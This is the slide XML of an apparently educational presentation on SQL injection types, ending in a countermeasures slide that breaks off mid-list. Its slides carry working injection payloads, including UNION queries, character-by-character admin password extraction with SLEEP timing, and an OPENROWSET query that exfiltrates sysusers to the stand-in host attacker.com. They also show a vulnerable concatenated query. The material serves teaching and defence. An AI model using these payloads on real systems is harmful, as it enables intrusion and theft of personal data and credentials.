          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In-Band SQL Injection</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4092ECE0-CD4C-DD6B-2CD0-CA064B4E642A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In-band SQL injection is a type of SQL injection where the attacker receives the result as a direct response using the same communication channel. For example, if the attacker performs the attack manually using a web browser, the result of the attack will be displayed in the same web browser. In-band SQL injection is also called classic SQL injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example: SELECT * FROM users WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> LIKE '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>current_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A malicious hacker can provide </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0" err="1"/>
              <a:t>current_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SELECT * FROM users WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> LIKE '%'--’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The percent sign in SQL is a wildcard, so as a result of the attack, the application will display the content of the entire </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> table (personal data), not just a single user record.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="576856700"/>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3DA1C-C14D-ECF6-D948-122F595727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30E9AE-85D0-65AE-EAE0-296C3820595F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In-Band SQL Injection - Error-based SQLi</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{39A2E25F-D0EF-B3F5-B81B-815B894DF880}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="516194" y="825388"/>
            <a:ext cx="7907806" cy="4439786"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker performs actions that cause the database to produce error messages. The attacker can potentially use the data provided by these error messages to gather information about the structure of the database.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>SELECT * FROM users WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>current_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>User Input: 1’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>As a result, the query becomes: SELECT * FROM users WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> = '1''</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The doubled single quote at the end of the query causes the database to report an error. If the web server is configured to display errors on screen, the attacker may see a message such as the following: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "' at line 1Warning: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>mysql_fetch_array</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>() expects parameter 1 to be resource, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>booleangiven</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> in /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>hj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>/var/www/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>query.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> on line 37</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1473323659"/>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0B359-01AD-29BB-FC29-0E96A4EF12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8F5037-73FC-6F29-4D04-9F757C8073A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In-Band SQL Injection - Union-based SQLi</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{496D17A8-ABC9-FC18-7F72-A7B744081FBE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This technique takes advantage of the UNION SQL operator, which fuses multiple select statements generated by the database to get a single HTTP response. This response may contain data that can be leveraged by the attacker.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SELECT * FROM users WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>current_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attacker Input: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-1' UNION SELECT version(),</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>current_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()--’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>As a result, the query becomes: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>SELECT * FROM users WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> = '-1' UNION SELECT version(),</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>current_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>()--’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>version</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>current_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> functions in MySQL return the database version and the name of the current operating system user. As a result, the attacker receives the following information:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>5.1.73-0ubuntu0.10.04.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>mysql@localhost</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3096183903"/>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57159-C447-3948-3B82-224B719BD28B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Blind SQLi — Boolean-based</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0BBCE64-056F-FCFB-AF39-D14F6CBF6958}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="752168"/>
            <a:ext cx="7704000" cy="4391332"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Blind SQL injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a type of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>SQL injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> where the attacker does not receive an obvious response from the attacked database and instead reconstructs the database structure step-by-step by observing the behavior of the database server and the application. Blind SQL injection is also called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>inferential SQL injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	SELECT * FROM products WHERE id = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>product_id</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attacker provides two inputs:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	SELECT * FROM products WHERE id = 42 and 1=1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	SELECT * FROM products WHERE id = 42 and 1=0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If the application </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>behaves differently </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>in each case, it is susceptible to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>boolean</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-based blind SQL injections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Breaking Password character by character:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5'#</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="314039921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B20AE-D588-2578-3D35-010A579523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606DE8-FFB0-DF22-345A-F19ADA59CF5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Blind SQLi — Time-based </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{453D4027-D249-0EA5-2902-31F71BCBE4D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="752168"/>
            <a:ext cx="7704000" cy="4391332"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = "SELECT * FROM orders WHERE id = '" + user + “’;”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>id=1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) – </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Observable effect:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> If response is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> seconds slower, first character = 'a'. Repeat to enumerate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4002251207"/>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EDB5A-C031-3546-EB52-94FC05C90BBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Out-of-band SQL injection</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E889D2CC-40D2-C4AA-8B25-CF849F41432F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="825388"/>
            <a:ext cx="7704000" cy="4213644"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Out-of-band SQL injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>OOB SQLi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) is a type of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>SQL injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> where the attacker does not receive a response from the attacked application on the same communication channel but instead is able to cause the application to send data to a remote endpoint that they control.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Example payload for Microsoft SQL Server:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>SELECT (SELECT user FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>sysusers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> FOR XML PATH('')) AS Result </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>    INTO OPENROWSET('SQLOLEDB', </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>        'Server=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>attacker.com;User</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> ID=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>user;Password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>=pass')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It executes a query to get all usernames from the system </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sysusers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> table and formats them into a single XML string.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It sends that XML string to a malicious SQL Server (attacker.com) set up by the attacker, effectively stealing the data.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="270075987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EAA6-6C29-ABB2-4B0C-73AEB1A80C85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>SQL Injection — Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2FFCDB1D-5027-BCD8-1B0D-724E644D94BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="825388"/>
            <a:ext cx="7704000" cy="4171440"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1900" dirty="0"/>
              <a:t>Use parameterized queries  — never concatenate user input into SQL.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1900" dirty="0"/>
              <a:t>Apply input validation &amp; whitelisting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1900" dirty="0"/>
              <a:t>Least-privilege DB accounts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1900" dirty="0"/>
              <a:t>Hide database errors from users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1900" dirty="0"/>
              <a:t>Disable risky DB features &amp; restrict egress using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
